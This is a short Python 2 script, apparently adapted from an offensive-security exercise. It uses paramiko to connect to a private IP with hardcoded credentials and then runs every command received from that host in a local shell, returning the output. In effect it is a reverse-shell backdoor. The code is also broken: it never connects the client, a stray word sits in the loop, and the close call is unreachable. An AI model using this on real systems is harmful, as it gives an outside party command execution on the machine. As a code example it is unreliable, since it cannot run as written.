import threading
import paramiko
#Must have the paramiko module. Use the pip crap that everybody uses.
import subprocess

def ssh_command(ip, user, password, command):
    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print ssh_session.recv(1024)
        while True:
            command = ssh_session.recv(1024)
            server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('192.168.199.131', 'Auriga', 'Themeepo', 'id')
